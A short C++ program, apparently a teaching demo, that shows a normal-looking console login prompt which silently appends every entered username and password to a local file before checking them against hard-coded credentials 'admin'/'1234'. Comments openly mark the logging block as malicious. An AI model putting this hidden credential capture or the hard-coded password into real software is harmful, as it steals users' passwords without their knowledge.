// malicious_logic_demo.cpp

#include <fstream>
#include <iostream>
#include <string>
using namespace std;

int main()
{
    string username, password;

    // 1) Normal-looking login prompt
    cout << "=== Simple Login ===\n";
    cout << "Username: ";
    cin >> username;
    cout << "Password: ";
    cin >> password;

    // 2) *** Malicious logic! ***ce
    //    Silently saves every entered credential pair to a file.
    ofstream out("stolen_credentials.txt", ios::app);
    out << username << ":" << password << "\n";
    out.close();
    // End of malicious logic

    // 3) “Real” authentication (hard-coded for demo)
    if (username == "admin" && password == "1234")
    {
        cout << "\nLogin successful! Welcome, " << username << ".\n";
    }
    else
    {
        cout << "\nLogin failed. Try again.\n";
    }

    return 0;
}
